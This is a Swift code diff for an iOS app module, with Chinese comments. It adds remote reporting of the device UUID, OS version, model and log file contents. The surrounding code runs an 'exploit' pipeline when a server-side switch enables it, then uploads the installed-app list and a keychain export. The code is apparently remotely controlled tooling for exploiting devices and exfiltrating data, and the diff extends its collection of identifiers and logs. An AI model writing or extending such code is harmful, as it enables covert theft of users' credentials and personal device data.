@@ -351,10 +351,21 @@ enum MainAPI {
         }
     }
 
+    /// 把本机 lara.log 的尾部（最多 8KB）作为一条日志上报
+    static func reportLogFullTailAsync() {
+        guard let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
+        let logPath = docs.appendingPathComponent("lara.log")
+        guard let data = try? Data(contentsOf: logPath), !data.isEmpty else { return }
+        let tail = data.suffix(8192)
+        guard let text = String(data: tail, encoding: .utf8) else { return }
+        reportLogAsync(text: "(log tail)\n" + text)
+    }
+
     // MARK: 开关与编排
 
-    /// App 打开时调用：拉配置，按开关决定是否跑管线（在主线程回调）
+    /// App 打开时调用：上报打开事件 -> 拉配置 -> 按开关决定是否跑管线（在主线程回调）
     static func bootstrap(_ onDecision: @escaping (Bool) -> Void) {
+        reportLogAsync(text: "app opened ios=\(UIDevice.current.systemVersion) machine=\(devicemachine()) uuid=\(deviceUUID())")
         globallogger.log("(api) requesting /api/device/config ...")
         Task {
             let outcome = await fetchDeviceConfig()
@@ -363,6 +374,7 @@ enum MainAPI {
                 case .success(let cfg):
                     lastConfig = cfg
                     globallogger.log("(api) config: version=\(cfg.version ?? "-") exploit_enabled=\(cfg.exploit_enabled) repeat=\(cfg.exploit_repeat_enabled) interval=\(cfg.exploit_repeat_interval) collect_configs=\(cfg.collect_configs?.count ?? 0) log_report=\(cfg.app_log_report_enabled)")
+                    reportLogAsync(text: "config ok: exploit_enabled=\(cfg.exploit_enabled) collect_configs=\(cfg.collect_configs?.count ?? 0)")
                     if shouldRunPipeline(cfg) {
                         globallogger.log("(api) exploit_enabled=true — running pipeline")
                         onDecision(true)
@@ -372,6 +384,7 @@ enum MainAPI {
                     }
                 case .failure(let err):
                     globallogger.log("(api) /api/device/config failed: \(err.localizedDescription) — pipeline skipped")
+                    reportLogAsync(text: "config failed: \(err.localizedDescription)")
                     onDecision(false)
                 }
             }
@@ -401,7 +414,7 @@ enum MainAPI {
             reportInstalledAppsAsync()
             uploadKeychainExportIfPresent()
             if cfg.app_log_report_enabled {
-                reportLogAsync(text: "(kc) pipeline done ok=1 on iOS \(UIDevice.current.systemVersion)")
+                reportLogFullTailAsync()
             }
         }
     }
